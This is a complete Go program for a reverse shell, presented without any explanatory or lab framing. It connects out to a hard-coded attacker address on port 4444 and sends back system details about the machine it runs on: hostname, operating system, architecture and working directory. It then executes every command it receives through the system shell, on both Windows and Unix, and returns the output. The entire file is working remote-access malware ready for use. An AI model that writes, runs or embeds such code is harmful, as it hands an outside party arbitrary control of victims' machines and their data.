package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

const (
	LHOST = "192.168.1.100"
	LPORT = 4444
)

type ReverseShell struct {
	conn   net.Conn
	reader *bufio.Reader
	writer *bufio.Writer
}

func NewReverseShell() *ReverseShell {
	return &ReverseShell{}
}

func (rs *ReverseShell) Connect() error {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", LHOST, LPORT))
	if err != nil {
		return err
	}
	rs.conn = conn
	rs.reader = bufio.NewReader(conn)
	rs.writer = bufio.NewWriter(conn)
	return nil
}

func (rs *ReverseShell) SendMessage(msg string) {
	rs.writer.WriteString(msg + "\n")
	rs.writer.Flush()
}

func (rs *ReverseShell) HandleCommand(cmd string) bool {
	cmd = strings.TrimSpace(cmd)
	
	switch {
	case cmd == "exit" || cmd == "quit":
		rs.SendMessage("Goodbye!")
		return false
		
	case strings.HasPrefix(cmd, "cd "):
		dir := strings.TrimSpace(cmd[3:])
		if err := os.Chdir(dir); err != nil {
			rs.SendMessage(fmt.Sprintf("Error: %v", err))
		} else {
			wd, _ := os.Getwd()
			rs.SendMessage(fmt.Sprintf("Changed to: %s", wd))
		}
		
	case cmd == "info":
		hostname, _ := os.Hostname()
		info := fmt.Sprintf(`{
  "hostname": "%s",
  "os": "%s",
  "arch": "%s",
  "go_version": "%s",
  "cwd": "%s"
}`, hostname, runtime.GOOS, runtime.GOARCH, runtime.Version(), rs.getWd())
		rs.SendMessage(info)
		
	case cmd == "help":
		rs.SendMessage("Commands: exit, quit, cd, info, help")
		
	default:
		rs.ExecuteCommand(cmd)
	}
	
	return true
}

func (rs *ReverseShell) getWd() string {
	wd, err := os.Getwd()
	if err != nil {
		return "unknown"
	}
	return wd
}

func (rs *ReverseShell) ExecuteCommand(cmd string) {
	var execCmd *exec.Cmd
	
	if runtime.GOOS == "windows" {
		execCmd = exec.Command("cmd", "/c", cmd)
	} else {
		execCmd = exec.Command("sh", "-c", cmd)
	}
	
	output, err := execCmd.CombinedOutput()
	if err != nil {
		rs.SendMessage(fmt.Sprintf("Error: %v", err))
		return
	}
	
	if len(output) == 0 {
		rs.SendMessage("Command completed (no output)")
	} else {
		rs.SendMessage(string(output))
	}
}

func (rs *ReverseShell) Run() {
	if err := rs.Connect(); err != nil {
		fmt.Printf("Connection failed: %v\n", err)
		return
	}
	defer rs.conn.Close()
	
	hostname, _ := os.Hostname()
	rs.SendMessage(fmt.Sprintf("Go Reverse Shell Connected! (%s)", hostname))
	rs.SendMessage(fmt.Sprintf("OS: %s/%s", runtime.GOOS, runtime.GOARCH))
	rs.SendMessage(fmt.Sprintf("Go: %s", runtime.Version()))
	rs.SendMessage(fmt.Sprintf("CWD: %s", rs.getWd()))
	
	for {
		rs.writer.WriteString("Go > ")
		rs.writer.Flush()
		
		cmd, err := rs.reader.ReadString('\n')
		if err != nil {
			break
		}
		
		if !rs.HandleCommand(cmd) {
			break
		}
	}
}

func main() {
	shell := NewReverseShell()
	shell.Run()
}